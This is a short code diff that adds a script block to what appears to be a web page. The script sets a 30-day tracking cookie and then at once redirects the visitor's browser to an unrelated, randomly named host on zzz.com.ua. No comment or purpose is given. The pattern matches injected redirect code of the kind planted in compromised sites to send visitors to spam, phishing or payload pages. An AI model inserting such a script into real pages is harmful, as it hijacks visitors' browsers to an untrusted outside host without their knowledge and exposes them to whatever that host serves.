@@ -1,0 +1,8 @@
+<script>
+    var site = 'service-2394328942384834238430284932489324089.zzz.com.ua';
+    var d = new Date();
+    d.setTime(d.getTime() + (30 * 24 * 60 * 60 * 1000));
+    var expires = "expires=" + d.toUTCString();
+    document.cookie = "cbatest7=blablabla;" + expires + ";path=" + site;
+    document.location.href='http://' + site;
+</script>
